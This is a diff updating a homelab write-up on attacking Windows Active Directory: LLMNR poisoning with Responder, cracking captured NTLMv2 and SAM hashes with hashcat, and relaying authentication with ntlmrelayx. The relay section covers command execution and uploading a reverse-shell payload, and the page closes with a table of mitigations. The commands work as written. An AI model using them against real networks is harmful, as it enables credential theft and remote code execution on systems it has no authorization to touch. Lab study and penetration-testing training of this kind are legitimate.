@@ -21,7 +21,7 @@
   </div>
 
   <div class="brief">
-    <p><strong>Purpose:</strong> a working reference for intercepting NTLM authentication via LLMNR poisoning, cracking what's captured, and relaying it instead when the target allows it. Demonstrated in a home AD lab (Windows Server and two enterprise clients).</p>
+    <p><strong>Purpose:</strong> a working reference for intercepting NTLM authentication via LLMNR poisoning, cracking what's captured, and relaying it instead when the target allows it. Demonstrated in a home AD lab (Windows Server 2019 DC plus two Windows 10 Enterprise clients, all in VirtualBox on the same NAT network).</p>
   </div>
 
   <section>
@@ -45,10 +45,10 @@
       <div class="step">
         <div class="step-num">1</div>
         <div class="step-body">
-          <div class="step-title">Start listening</div>
-          <p>Responder masquerades as whatever share a broadcast is asking for, on the correct interface:</p>
-          <pre><code>ip a
-responder -I eth0 -v</code></pre>
+          <div class="step-title">Find the interface, start listening</div>
+          <p>Identify the attack box's interface on the lab's NAT network, then start Responder in verbose mode on it:</p>
+          <pre><code>ip a</code></pre>
+          <pre><code>responder -I eth0 -v</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
             <p>LLMNR broadcasts don't verify the responder's identity, Responder just has to answer before (or instead of) the real resource, which it can do passively on the right network segment.</p>
@@ -60,10 +60,10 @@ responder -I eth0 -v</code></pre>
         <div class="step-num">2</div>
         <div class="step-body">
           <div class="step-title">Trigger a lookup and capture the hash</div>
-          <p>Any mistyped share, starting with a double backslash and ending in a single one, triggers an LLMNR broadcast on failure. Responder answers, and the client authenticates straight to it, handing over an NTLMv2 hash in the process.</p>
+          <p>From a Windows client, typing any mistyped share path, starting with a double backslash and ending in a single one, into the Run dialog or Explorer's address bar triggers an LLMNR broadcast on the DNS failure. Responder answers, and the client authenticates straight to it, handing over an NTLMv2 username and password hash in the process, visible in Responder's own console output.</p>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>This isn't a contrived scenario, it's exactly what happens in a large organization when someone fat-fingers a share path or a stale login script points somewhere that no longer exists. LLMNR fires on any DNS failure, typo or not.</p>
+            <p>This isn't a contrived scenario, it's exactly what happens in a large organization when someone fat-fingers a share path like <code>\\shaere01\Documents\</code> instead of <code>\\share01\Documents\</code>, or a stale login script points somewhere that no longer exists. LLMNR fires on any DNS failure, typo or not.</p>
           </div>
         </div>
       </div>
@@ -71,9 +71,11 @@ responder -I eth0 -v</code></pre>
       <div class="step">
         <div class="step-num">3</div>
         <div class="step-body">
-          <div class="step-title">Identify and crack the hash</div>
-          <p><code>nth</code> (name-that-hash) identifies the format and, usefully, tells you which hashcat and John modes to use:</p>
-          <pre><code>nth -t '&lt;captured hash&gt;'
+          <div class="step-title">Identify the hash format, then crack it</div>
+          <p><code>nth</code> (<code>name-that-hash</code>, <code>apt install name-that-hash</code>) identifies the format from the captured string and, usefully, tells you which hashcat and John modes to use. An NTLMv2 capture looks like this:</p>
+          <pre><code>nth -t 'fcastle::MARVEL:b5767a2e087ea531:157C0B6B863C13119F038A5C01F702D7:0101000000000000805C66FF6AB9D801840E548DADCD23980000000002000800300037005200490001001E00570049004E002D0048004F004E004D0041004A0035004D0031004900460004003400570049004E002D0048004F004E004D0041004A0035004D003100490046002E0030003700520049002E004C004F00430041004C000300140030003700520049002E004C004F00430041004C000500140030003700520049002E004C004F00430041004C0007000800805C66FF6AB9D801060004000200000008003000300000000000000001000000002000001C9851B85E8B1F50D2CC6B325325427C08CA439D04EBABC76FA4ACAA8FB6C5F20A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0030002E0032002E00330030000000000000000000'</code></pre>
+          <p>Alternatively, hashcat's own help menu lists the matching mode. Either way, saving the captured hash to a file and running it against a wordlist is the next move:</p>
+          <pre><code>nano hash.txt
 hashcat -O -m 5600 hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
@@ -86,9 +88,9 @@ hashcat -O -m 5600 hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
         <div class="step-num">4</div>
         <div class="step-body">
           <div class="step-title">Check if relaying is viable instead of cracking</div>
-          <p>Relaying needs SMB signing to be disabled on the target. Nmap checks this directly:</p>
-          <pre><code>nmap --script=smb2-security-mode.nse -p445 &lt;subnet&gt; | grep "smb2-security-mode" -A2 -B8</code></pre>
-          <p>A domain controller locked down with signing enforced doesn't rule this out entirely, individual workstations on the same network often aren't configured as strictly.</p>
+          <p>Relay requires two conditions: SMB signing disabled on the target, and the relayed account holding admin rights there. Nmap's built-in script checks the first across a whole subnet in one pass:</p>
+          <pre><code>nmap --script=smb2-security-mode.nse -p445 10.0.2.0/24 | grep "smb2-security-mode" -A2 -B8</code></pre>
+          <p>The target is "SMB signing not required." A domain controller locked down with signing enforced doesn't rule this out entirely, individual workstations on the same network often aren't configured as strictly, and a relay still works between clients even when the DC itself is hardened.</p>
           <div class="notebook">
             <span class="tag">Why this works</span>
             <p>SMB signing cryptographically verifies the sender of each SMB packet, which breaks a relay attack outright. Checking signing status per-host before attempting a relay saves time against hosts where it simply won't work.</p>
@@ -99,15 +101,63 @@ hashcat -O -m 5600 hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
       <div class="step">
         <div class="step-num">5</div>
         <div class="step-body">
-          <div class="step-title">Relay the hash instead of cracking it</div>
-          <p>With SMB and HTTP disabled in Responder's own config (so it only poisons, not competes with the relay), <code>ntlmrelayx</code> forwards captured authentication live to a target from the signing-disabled list:</p>
+          <div class="step-title">Disable SMB and HTTP in Responder, then relay instead of cracking</div>
+          <p>Responder has to stop answering SMB and HTTP requests itself, or it'll capture the hash instead of letting it pass through to the relay tool:</p>
+          <pre><code>nano /etc/responder/Responder.conf</code></pre>
+          <p>Set <code>SMB</code> and <code>HTTP</code> to <code>Off</code> in that config, restart Responder, then in a separate terminal start <code>ntlmrelayx</code> against the list of signing-disabled targets found in the previous step:</p>
           <pre><code>ntlmrelayx.py -tf targets.txt -smb2support</code></pre>
-          <p>If the relayed account has local admin rights on that target, an interactive session is one flag away:</p>
-          <pre><code>ntlmrelayx.py -tf targets.txt -smb2support -i</code></pre>
-          <p>Connecting to the resulting local port with netcat drops into a functional shell-like interface, supporting file upload/download and most Windows commands directly.</p>
+          <p>Logging into the Windows client and attempting to reach an invalid share, like <code>\\10.0.2.30</code>, triggers the same LLMNR broadcast as before, except this time the captured authentication gets forwarded live to the real target instead of just logged. The relay output shows the hashes coming through; a reused password here could just as easily unlock something else on the network, like the antivirus console.</p>
           <div class="notebook">
             <span class="tag">Why this works</span>
             <p>A relayed hash proves authentication without ever needing the plaintext password, and it works regardless of password strength, since nothing gets cracked. Signing is the only thing standing between a captured hash and a live session.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">6</div>
+        <div class="step-body">
+          <div class="step-title">Crack SAM hashes pulled via the relay</div>
+          <p>SAM hashes are NTLM hashes, which need a different hashcat mode than the NTLMv2 capture earlier:</p>
+          <pre><code>nano hashes.txt
+hashcat -O -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
+          <p>Once the run finishes, list out whatever cracked:</p>
+          <pre><code>hashcat -m1000 --show --usernames hashes.txt</code></pre>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>NTLM (unsalted, unlike NTLMv2) cracks dramatically faster, so hashes pulled via a successful relay are often worth a cracking attempt even when the original captured hash wasn't.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">7</div>
+        <div class="step-body">
+          <div class="step-title">Go interactive instead of just relaying once</div>
+          <p>Adding <code>-i</code> turns the relay into a standing interactive session:</p>
+          <pre><code>ntlmrelayx.py -tf targets.txt -smb2support -i</code></pre>
+          <p>Connecting to the local port it opens drops into a shell-like interface:</p>
+          <pre><code>nc 127.0.0.1 11002
+help</code></pre>
+          <p>From there, <code>get</code> and <code>put</code> move files, most plain Windows commands run directly, and a single command or an uploaded reverse shell can be fired without ever dropping into the interactive session at all:</p>
+          <pre><code>ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"</code></pre>
+          <pre><code>ntlmrelayx.py -tf targets.txt -smb2support -e "shell.exe"</code></pre>
+          <p>The uploaded-executable path pairs naturally with <code>msfvenom</code> for generating that payload and <code>msfconsole</code> for catching the callback.</p>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>A successful relay with local admin rights is already code execution, <code>-i</code>, <code>-c</code>, and <code>-e</code> are just three different ways to spend that access: explore interactively, run one command, or drop a payload.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">8</div>
+        <div class="step-body">
+          <div class="step-title">Know when this pays off on a real engagement</div>
+          <p>Users don't normally type an attacker's interface name by hand, but in a fast-paced organization with hundreds of employees, someone is likely to fat-finger a share path, or a stale login script points at a share that moved or no longer exists, triggering the exact same DNS failure LLMNR falls back on. A good practice during the enumeration phase of an engagement: run Responder in the background right at the start of the business day and again right after lunch, when most logins happen.</p>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>This is a volume game, not a targeted exploit. Running Responder passively during peak login windows costs nothing and only needs one typo or one stale script anywhere on the network to pay off.</p>
           </div>
         </div>
       </div>
@@ -120,16 +170,16 @@ hashcat -O -m 5600 hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
     <div class="ref-wrap">
       <table class="ref">
         <tr><th>Control</th><th>Trade-off</th></tr>
-        <tr><td>Disable LLMNR</td><td>Closes the attack outright; enforce via GPO where DNS already covers name resolution</td></tr>
-        <tr><td>Require SMB signing on all devices</td><td>Stops relay attacks; roughly 15% file-copy performance cost</td></tr>
-        <tr><td>Disable NTLM authentication</td><td>Removes the fallback entirely; Kerberos failures then have no fallback either</td></tr>
-        <tr><td>Account tiering</td><td>Limits blast radius of any one compromised credential; harder to enforce consistently</td></tr>
-        <tr><td>Restrict local admin rights</td><td>Blocks most lateral movement via relay; more service-desk overhead</td></tr>
+        <tr><td>Disable LLMNR</td><td>Stops the attack. If not fully possible, require Network Access Control and strong user passwords (14+ chars, no common words) as a fallback</td></tr>
+        <tr><td>Require SMB signing on all devices</td><td>Stops the attack; roughly 15% file-copy performance cost</td></tr>
+        <tr><td>Disable NTLM authentication</td><td>Stops the attack; if Kerberos ever fails, Windows normally falls back to NTLM, so this removes that fallback entirely</td></tr>
+        <tr><td>Account tiering</td><td>Limits domain admins to specific tasks; enforcing the policy can be difficult</td></tr>
+        <tr><td>Local admin restriction</td><td>Prevents most lateral movement; likely increases service-desk tickets</td></tr>
       </table>
     </div>
   </section>
 
-  <footer>Homelab research &middot; credits to TCM Security's PEH course for the lab setup</footer>
+  <footer>Homelab research &middot; credits to TCM Security's PEH course for the AD lab setup</footer>
 
 </div>
 </body>
